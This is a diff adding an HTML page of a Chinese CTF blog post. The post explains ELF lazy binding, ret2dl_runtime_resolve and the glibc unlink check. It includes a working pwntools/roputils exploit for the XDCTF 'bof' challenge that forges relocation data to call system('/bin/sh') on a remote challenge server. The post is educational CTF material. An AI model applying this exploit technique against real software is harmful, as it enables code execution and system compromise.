@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"http:/blog.naive.codes","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="dl_runtime_resolve这里使用XDCTF-Bof题目进行演示123456789101112131415161718192021222324252627282930313233343536373839404142434445/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_">
+<meta name="keywords" content="Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="暑假学习-Day2">
+<meta property="og:url" content="http:/blog.naive.codes/2020/07/15/暑假学习-Day2/index.html">
+<meta property="og:site_name" content="Sndav&#39;s Blog">
+<meta property="og:description" content="dl_runtime_resolve这里使用XDCTF-Bof题目进行演示123456789101112131415161718192021222324252627282930313233343536373839404142434445/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://codimd.s3.shivering-isles.com/demo/uploads/upload_8261e4b572b6b984b631927f2a541c82.png">
+<meta property="og:image" content="https://codimd.s3.shivering-isles.com/demo/uploads/upload_200066759c9a285eab14ed397de1bb0d.png">
+<meta property="og:image" content="https://codimd.s3.shivering-isles.com/demo/uploads/upload_b59f7e3ec767df8fef0c0cc41ae17fa0.png">
+<meta property="og:updated_time" content="2020-07-15T08:03:02.930Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="暑假学习-Day2">
+<meta name="twitter:description" content="dl_runtime_resolve这里使用XDCTF-Bof题目进行演示123456789101112131415161718192021222324252627282930313233343536373839404142434445/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_">
+<meta name="twitter:image" content="https://codimd.s3.shivering-isles.com/demo/uploads/upload_8261e4b572b6b984b631927f2a541c82.png">
+
+<link rel="canonical" href="http:/blog.naive.codes/2020/07/15/暑假学习-Day2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>暑假学习-Day2 | Sndav's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-143542187-2"></script>
+    <script pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-143542187-2');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sndav's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http:/blog.naive.codes/2020/07/15/暑假学习-Day2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sndav@Dubhe">
+      <meta itemprop="description" content="A Dubhe CTFer lives harder and harder">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sndav's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          暑假学习-Day2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-07-15 16:02:24 / 修改时间：16:03:02" itemprop="dateCreated datePublished" datetime="2020-07-15T16:02:24+08:00">2020-07-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="dl_runtime_resolve"></a>dl_runtime_resolve</h2><p>这里使用<code>XDCTF-Bof</code>题目进行演示<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span></span><br><span class="line"><span class="comment">/* WARNING: Could not reconcile some variable overlaps */</span></span><br><span class="line"></span><br><span class="line"><span class="function">undefined4 <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> __n;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  undefined4 *puVar2;</span><br><span class="line">  <span class="keyword">char</span> local_84 [<span class="number">100</span>];</span><br><span class="line">  </span><br><span class="line">  local_84._0_4_ = <span class="number">0x636c6557</span>;</span><br><span class="line">  local_84._4_4_ = <span class="number">0x20656d6f</span>;</span><br><span class="line">  local_84._8_4_ = <span class="number">0x58206f74</span>;</span><br><span class="line">  local_84._12_4_ = <span class="number">0x46544344</span>;</span><br><span class="line">  local_84._16_4_ = <span class="number">0x35313032</span>;</span><br><span class="line">  local_84._20_4_ = <span class="number">0xa217e</span>;</span><br><span class="line">  iVar1 = <span class="number">0x13</span>;</span><br><span class="line">  puVar2 = (undefined4 *)(local_84 + <span class="number">0x18</span>);</span><br><span class="line">  <span class="keyword">while</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = iVar1 + <span class="number">-1</span>;</span><br><span class="line">    *puVar2 = <span class="number">0</span>;</span><br><span class="line">    puVar2 = puVar2 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,local_84);</span><br><span class="line">  __n = <span class="built_in">strlen</span>(local_84);</span><br><span class="line">  write(<span class="number">1</span>,local_84,__n);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">===</span><br><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> vuln(<span class="keyword">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> local_70 [<span class="number">104</span>];</span><br><span class="line">  </span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,local_70);</span><br><span class="line">  read(<span class="number">0</span>,local_70,<span class="number">0x100</span>); <span class="comment">// 过于显然的漏洞</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Linux中的延时绑定"><a href="#Linux中的延时绑定" class="headerlink" title="Linux中的延时绑定"></a>Linux中的延时绑定</h3><blockquote>
+<p>引自<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
+</blockquote>
+<p>程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。<br>具体来说，在前一部分我们已经知道，当程序执行<code>call write@plt</code>时，实际会跳到0x0804a01c去执行。而0x0804a01c处的汇编代码仅仅三行。我们来看一下这三行代码做了什么。<br>第一行：前面提到过0x0804a01c是write的GOT表位置，当我们第一次调用write时，其对应的GOT表里并没有存放write的真实地址，而是<code>write@plt</code>的下一条指令地址。<br><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_8261e4b572b6b984b631927f2a541c82.png" alt></p>
+<p>第二、三行：把<code>reloc_arg=0x20</code>作为参数推入栈中，跳到<code>0x08048380（PLT[0]）</code>继续执行。<br><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_200066759c9a285eab14ed397de1bb0d.png" alt></p>
+<p><code>0x08048380（PLT[0]）</code>再把<code>link_map=*(GOT+4)</code>（即GOT[1]，链接器的标识信息）作为参数推入栈中，而<code>*(GOT+8)</code>（即GOT[2]，动态链接器中的入口点）中保存的是<code>_dl_runtime_resolve</code>函数的地址。因此以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的write函数地址写入其GOT条目中，随后把控制权交给write函数。</p>
+<p><code>_dl_runtime_resolve是在glibc-2.23/sysdeps/i386/dl-trampoline.S</code>中用汇编实现的。0xf7fededb处即调用<code>_dl_fixup</code>，并且通过寄存器传参。<br><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_b59f7e3ec767df8fef0c0cc41ae17fa0.png" alt></p>
+<h3 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup"></a>_dl_fixup</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用分为以下几步</p>
+<ol>
+<li>控制eip为PLT[0]的地址，只需传递一个reloc_arg参数</li>
+<li>控制reloc_arg的大小，使reloc的位置落在可控地址内</li>
+<li>伪造reloc的内容，使sym落在可控地址内</li>
+<li>伪造sym的内容，使name落在可控地址内</li>
+<li>伪造name为任意库函数，如system</li>
+</ol>
+<p>由于过程复杂，我们可以使用roputils进行构造，exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./bof'</span></span><br><span class="line">host = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="number">27980</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.R:</span><br><span class="line">    context.terminal = [<span class="string">'terminator'</span>, <span class="string">'--new-tab'</span>, <span class="string">'-x'</span>] </span><br><span class="line">    context.log_level = <span class="string">'debug'</span> </span><br><span class="line">    <span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">    <span class="keyword">if</span> args.D:</span><br><span class="line">           cmd = <span class="string">'set follow-fork-mode parent\nb *0x8048370'</span></span><br><span class="line">           p = gdb.debug(exe, cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">           p = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(host,port)</span><br><span class="line">    <span class="comment"># libc = ELF('xxxx')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"!\n"</span>)</span><br><span class="line">    offset = <span class="number">112</span></span><br><span class="line">    rop = ROP(exe)</span><br><span class="line">    bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">    buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">    buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line">    <span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">    buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">    p.send(buf)</span><br><span class="line"></span><br><span class="line">    buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">    buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line">    <span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">    buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">    buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">    p.send(buf)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure></p>
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="什么时候会执行unlink操作"><a href="#什么时候会执行unlink操作" class="headerlink" title="什么时候会执行unlink操作"></a>什么时候会执行unlink操作</h3><ol>
+<li>执行malloc_consolidate分配large bin，或者无法在top chunk中获得的数据</li>
+<li>free时会检查前后chunk的P标志位</li>
+</ol>
+<h3 id="unlink-源码"><a href="#unlink-源码" class="headerlink" title="unlink 源码"></a>unlink 源码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">        FD = P-&gt;fd;                                                                      </span><br><span class="line">        BK = P-&gt;bk;                                                                      </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">            malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  </span><br><span class="line">        <span class="keyword">else</span> &#123;                                                                     </span><br><span class="line">            FD-&gt;bk = BK;                                                              </span><br><span class="line">            BK-&gt;fd = FD;                                                              </span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                                      </span><br><span class="line">                &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      </span><br><span class="line">                    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)  </span><br><span class="line">                        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">                            malloc_printerr (check_action, </span><br><span class="line">                                            <span class="string">"corrupted double-linked list (not small)"</span>,    </span><br><span class="line">                                             P, AV);       </span><br><span class="line">                    <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      </span><br><span class="line">                        <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class="line">                            FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      </span><br><span class="line">                        <span class="keyword">else</span> &#123;                                                          </span><br><span class="line">                            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              </span><br><span class="line">                            FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                             </span><br><span class="line">                            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              </span><br><span class="line">                            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              </span><br><span class="line">                        &#125;                                                              </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                        P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      </span><br><span class="line">                        P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      </span><br><span class="line">                    &#125;                                                                      </span><br><span class="line">           &#125;                                                                      </span><br><span class="line">     &#125;                                                                              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>FD-&gt;bk != P || BK-&gt;fd != P</code>是一个非常重要的验证，<br>根据CHUNK的结构，其可以转化为<code>p[2] == &amp;p-3 || p[3] == &amp;p-2</code>,通过unlink后可以造成<br><code>p = &amp;p-3</code></p>
+<h3 id="例题2017强网杯note2"><a href="#例题2017强网杯note2" class="headerlink" title="例题2017强网杯note2"></a>例题2017强网杯note2</h3><p>明日再续</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/13/GeekPwn-Web复盘-1/" rel="prev" title="GeekPwn-Web复盘(1)">
+      <i class="fa fa-chevron-left"></i> GeekPwn-Web复盘(1)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#dl-runtime-resolve"><span class="nav-number">1.</span> <span class="nav-text">dl_runtime_resolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux中的延时绑定"><span class="nav-number">1.1.</span> <span class="nav-text">Linux中的延时绑定</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dl-fixup"><span class="nav-number">1.2.</span> <span class="nav-text">_dl_fixup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">1.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink"><span class="nav-number">2.</span> <span class="nav-text">unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么时候会执行unlink操作"><span class="nav-number">2.1.</span> <span class="nav-text">什么时候会执行unlink操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink-源码"><span class="nav-number">2.2.</span> <span class="nav-text">unlink 源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例题2017强网杯note2"><span class="nav-number">2.3.</span> <span class="nav-text">例题2017强网杯note2</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Sndav@Dubhe</p>
+  <div class="site-description" itemprop="description">A Dubhe CTFer lives harder and harder</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sndav@Dubhe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '#pjax'
+  ],
